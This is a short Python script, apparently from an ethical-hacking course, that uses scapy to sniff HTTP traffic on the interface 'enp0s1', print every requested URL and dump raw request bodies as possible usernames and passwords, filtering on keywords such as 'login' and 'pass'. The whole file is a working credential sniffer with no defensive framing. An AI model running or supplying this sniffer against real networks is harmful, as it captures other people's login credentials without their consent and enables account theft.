#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP Request >> " + str(get_url(packet)))

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            print("\n\n[+] Possible username/password >> " + str(load) + "\n\n")
            keywords = ["username", "password", "login", "pass"]
            for keyword in keywords:
                if keyword in str(load):
                    print(str(packet[scapy.Raw].load))
                    break


sniff("enp0s1")